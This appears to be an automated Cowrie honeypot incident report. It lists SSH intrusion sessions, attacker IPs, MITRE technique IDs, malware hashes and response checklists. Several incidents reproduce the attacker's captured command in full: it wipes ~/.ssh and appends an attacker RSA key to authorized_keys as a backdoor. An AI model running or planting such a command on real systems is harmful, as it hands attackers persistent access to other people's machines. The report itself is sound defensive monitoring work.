| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:46:24` | `cowrie.session.connect` |
| `2026-04-26 19:46:24` | `cowrie.client.version` |
| `2026-04-26 19:46:25` | `cowrie.client.kex` |
| `2026-04-26 19:46:26` | `cowrie.login.success` |
| `2026-04-26 19:46:27` | `cowrie.session.params` |
| `2026-04-26 19:46:27` | `cowrie.command.input` |
| `2026-04-26 19:46:27` | `cowrie.command.failed` |
| `2026-04-26 19:46:27` | `cowrie.log.closed` |
| `2026-04-26 19:46:28` | `cowrie.session.params` |
| `2026-04-26 19:46:28` | `cowrie.command.input` |
| `2026-04-26 19:46:28` | `cowrie.session.file_download` |
| `2026-04-26 19:46:28` | `cowrie.log.closed` |
| `2026-04-26 19:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c904fc4db1

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:46 |
| **Last Seen** | 2026-04-26 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:46:32` | `cowrie.session.connect` |
| `2026-04-26 19:46:32` | `cowrie.client.version` |
| `2026-04-26 19:46:32` | `cowrie.client.kex` |
| `2026-04-26 19:46:33` | `cowrie.login.success` |
| `2026-04-26 19:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3f751ee848

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:47 |
| **Last Seen** | 2026-04-26 19:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:47:15` | `cowrie.session.connect` |
| `2026-04-26 19:47:15` | `cowrie.client.version` |
| `2026-04-26 19:47:15` | `cowrie.client.kex` |
| `2026-04-26 19:47:16` | `cowrie.login.success` |
| `2026-04-26 19:47:17` | `cowrie.session.params` |
| `2026-04-26 19:47:17` | `cowrie.command.input` |
| `2026-04-26 19:47:17` | `cowrie.command.failed` |
| `2026-04-26 19:47:17` | `cowrie.log.closed` |
| `2026-04-26 19:47:18` | `cowrie.session.params` |
| `2026-04-26 19:47:18` | `cowrie.command.input` |
| `2026-04-26 19:47:18` | `cowrie.session.file_download` |
| `2026-04-26 19:47:18` | `cowrie.log.closed` |
| `2026-04-26 19:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e0904976a4

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:47 |
| **Last Seen** | 2026-04-26 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:47:22` | `cowrie.session.connect` |
| `2026-04-26 19:47:22` | `cowrie.client.version` |
| `2026-04-26 19:47:22` | `cowrie.client.kex` |
| `2026-04-26 19:47:23` | `cowrie.login.success` |
| `2026-04-26 19:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41418952df12

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:48 |
| **Last Seen** | 2026-04-26 19:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:48:06` | `cowrie.session.connect` |
| `2026-04-26 19:48:06` | `cowrie.client.version` |
| `2026-04-26 19:48:06` | `cowrie.client.kex` |
| `2026-04-26 19:48:08` | `cowrie.login.success` |
| `2026-04-26 19:48:08` | `cowrie.session.params` |
| `2026-04-26 19:48:08` | `cowrie.command.input` |
| `2026-04-26 19:48:08` | `cowrie.command.failed` |
| `2026-04-26 19:48:09` | `cowrie.log.closed` |
| `2026-04-26 19:48:09` | `cowrie.session.params` |
| `2026-04-26 19:48:09` | `cowrie.command.input` |
| `2026-04-26 19:48:10` | `cowrie.session.file_download` |
| `2026-04-26 19:48:10` | `cowrie.log.closed` |
| `2026-04-26 19:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f47549588e3

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:48 |
| **Last Seen** | 2026-04-26 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:48:13` | `cowrie.session.connect` |
| `2026-04-26 19:48:13` | `cowrie.client.version` |
| `2026-04-26 19:48:14` | `cowrie.client.kex` |
| `2026-04-26 19:48:15` | `cowrie.login.success` |
| `2026-04-26 19:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb1f9cb93af

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:48 |
| **Last Seen** | 2026-04-26 19:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:48:59` | `cowrie.session.connect` |
| `2026-04-26 19:48:59` | `cowrie.client.version` |
| `2026-04-26 19:48:59` | `cowrie.client.kex` |
| `2026-04-26 19:49:00` | `cowrie.login.success` |
| `2026-04-26 19:49:01` | `cowrie.session.params` |
| `2026-04-26 19:49:01` | `cowrie.command.input` |
| `2026-04-26 19:49:01` | `cowrie.command.failed` |
| `2026-04-26 19:49:01` | `cowrie.log.closed` |
| `2026-04-26 19:49:02` | `cowrie.session.params` |
| `2026-04-26 19:49:02` | `cowrie.command.input` |
| `2026-04-26 19:49:03` | `cowrie.session.file_download` |
| `2026-04-26 19:49:03` | `cowrie.log.closed` |
| `2026-04-26 19:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d0a36a631f

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:49 |
| **Last Seen** | 2026-04-26 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:49:06` | `cowrie.session.connect` |
| `2026-04-26 19:49:06` | `cowrie.client.version` |
| `2026-04-26 19:49:06` | `cowrie.client.kex` |
| `2026-04-26 19:49:08` | `cowrie.login.success` |
| `2026-04-26 19:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272ebc4e0b27

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:49 |
| **Last Seen** | 2026-04-26 19:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:49:52` | `cowrie.session.connect` |
| `2026-04-26 19:49:52` | `cowrie.client.version` |
| `2026-04-26 19:49:52` | `cowrie.client.kex` |
| `2026-04-26 19:49:53` | `cowrie.login.success` |
| `2026-04-26 19:49:54` | `cowrie.session.params` |
| `2026-04-26 19:49:54` | `cowrie.command.input` |
| `2026-04-26 19:49:54` | `cowrie.command.failed` |
| `2026-04-26 19:49:54` | `cowrie.log.closed` |
| `2026-04-26 19:49:55` | `cowrie.session.params` |
| `2026-04-26 19:49:55` | `cowrie.command.input` |
| `2026-04-26 19:49:55` | `cowrie.session.file_download` |
| `2026-04-26 19:49:55` | `cowrie.log.closed` |
| `2026-04-26 19:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a3c8028e8ad

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:49 |
| **Last Seen** | 2026-04-26 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:49:59` | `cowrie.session.connect` |
| `2026-04-26 19:49:59` | `cowrie.client.version` |
| `2026-04-26 19:49:59` | `cowrie.client.kex` |
| `2026-04-26 19:50:01` | `cowrie.login.success` |
| `2026-04-26 19:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a97bfb9c583

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:50 |
| **Last Seen** | 2026-04-26 19:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:50:48` | `cowrie.session.connect` |
| `2026-04-26 19:50:48` | `cowrie.client.version` |
| `2026-04-26 19:50:48` | `cowrie.client.kex` |
| `2026-04-26 19:50:49` | `cowrie.login.success` |
| `2026-04-26 19:50:50` | `cowrie.session.params` |
| `2026-04-26 19:50:50` | `cowrie.command.input` |
| `2026-04-26 19:50:50` | `cowrie.command.failed` |
| `2026-04-26 19:50:50` | `cowrie.log.closed` |
| `2026-04-26 19:50:51` | `cowrie.session.params` |
| `2026-04-26 19:50:51` | `cowrie.command.input` |
| `2026-04-26 19:50:51` | `cowrie.session.file_download` |
| `2026-04-26 19:50:51` | `cowrie.log.closed` |
| `2026-04-26 19:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bafcfc1b2915

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:50 |
| **Last Seen** | 2026-04-26 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:50:55` | `cowrie.session.connect` |
| `2026-04-26 19:50:55` | `cowrie.client.version` |
| `2026-04-26 19:50:55` | `cowrie.client.kex` |
| `2026-04-26 19:50:57` | `cowrie.login.success` |
| `2026-04-26 19:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0062b2dd563e

| Field | Detail |
|---|---|
| **Source IP** | `118.196.117[.]234` |
| **First Seen** | 2026-04-26 20:06 |
| **Last Seen** | 2026-04-26 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 20:06:25` | `cowrie.session.connect` |
| `2026-04-26 20:06:25` | `cowrie.client.version` |
| `2026-04-26 20:06:25` | `cowrie.client.kex` |
| `2026-04-26 20:06:26` | `cowrie.login.success` |
| `2026-04-26 20:06:26` | `cowrie.session.params` |
| `2026-04-26 20:06:26` | `cowrie.command.input` |
| `2026-04-26 20:06:26` | `cowrie.log.closed` |
| `2026-04-26 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `118.196.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `170.238.160[.]191` | **20** | 2026-04-26 19:19 | 2026-04-26 19:51 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.12.69[.]68` | **14** | 2026-04-26 19:02 | 2026-04-26 19:18 | 15m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `124.29.194[.]148` | **7** | 2026-04-26 19:11 | 2026-04-26 19:13 | 1m | 0 | `T1592` | 🟢 LOW |
| `47.84.111[.]68` | **4** | 2026-04-26 19:20 | 2026-04-26 19:20 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `112.4.186[.]109` | 1 | 2026-04-26 19:12 | 2026-04-26 19:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.117[.]234` | 1 | 2026-04-26 20:06 | 2026-04-26 20:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.63.196[.]175` | 1 | 2026-04-26 19:01 | 2026-04-26 19:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.4.186[.]109` | CN | China Mobile Communications Corporation | **100** ⚠️ | 14 |
| `124.29.194[.]148` | PK | Broadband Services | **100** ⚠️ | 1 |
| `47.84.111[.]68` | SG | Alibaba Cloud LLC | **100** ⚠️ | 19 |
| `170.238.160[.]191` | BR | NCS-Fibra ( New Central Solutions ) | **100** ⚠️ | 50 |
| `182.66.193[.]212` | IN | Bharti Airtel Limited | **100** ⚠️ | 31 |
| `14.63.196[.]175` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `118.196.117[.]234` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 4 |
| `106.12.69[.]68` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `186.225.181[.]54` | BR | STIW Sistema de Telecom. Inf e Wireless LTDA | **45** | 0 |
| `98.117.10[.]184` | US | Verizon Business | **38** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 74 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 40 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |

---

## 🔕 False Positive Summary (50 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 24 |
